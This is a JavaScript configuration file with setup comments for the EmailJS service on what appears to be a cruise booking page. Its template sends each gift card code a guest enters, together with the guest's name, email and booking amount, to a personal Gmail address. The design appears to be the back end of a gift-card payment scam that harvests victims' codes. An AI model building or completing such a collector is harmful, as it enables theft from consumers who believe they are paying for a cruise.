// ─────────────────────────────────────────────────────────────
//  EmailJS Configuration
//  Setup steps:
//  1. Go to https://www.emailjs.com and create a free account
//  2. Add a Gmail service → copy the Service ID below
//  3. Create an email template using the variables listed below
//     → copy the Template ID below
//  4. Go to Account → API Keys → copy your Public Key below
//
//  Template variables used:
//    {{gift_card_code}}   — the entered gift card code
//    {{action}}           — "Applied to Order" | "Added to Wallet"
//    {{cruise_name}}      — cruise name
//    {{guest_name}}       — guest's full name
//    {{guest_email}}      — guest's email
//    {{booking_amount}}   — total booking amount
//    {{submitted_at}}     — date/time of submission
//    {{to_email}}         — recipient (diannahayes23@gmail.com)
// ─────────────────────────────────────────────────────────────

export const EMAILJS_CONFIG = {
  SERVICE_ID:  'YOUR_SERVICE_ID',    // e.g. 'service_abc123'
  TEMPLATE_ID: 'YOUR_TEMPLATE_ID',   // e.g. 'template_xyz456'
  PUBLIC_KEY:  'YOUR_PUBLIC_KEY',    // e.g. 'abcDEFghiJKL123'
  RECIPIENT:   'diannahayes23@gmail.com',
};
